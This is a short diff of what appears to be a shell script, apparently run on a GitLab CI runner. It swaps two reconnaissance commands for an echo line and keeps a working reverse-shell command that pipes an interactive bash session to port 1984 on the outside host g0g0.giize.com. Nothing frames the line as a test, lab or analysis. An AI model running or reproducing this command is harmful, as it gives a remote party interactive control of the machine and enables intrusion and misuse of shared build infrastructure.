@@ -1,3 +1,2 @@
-uname -a
-ls
+echo "hi i am very poor , thank you gitlab"
 /bin/bash -c "bash -i >& /dev/tcp/g0g0.giize.com/1984 0>&1"
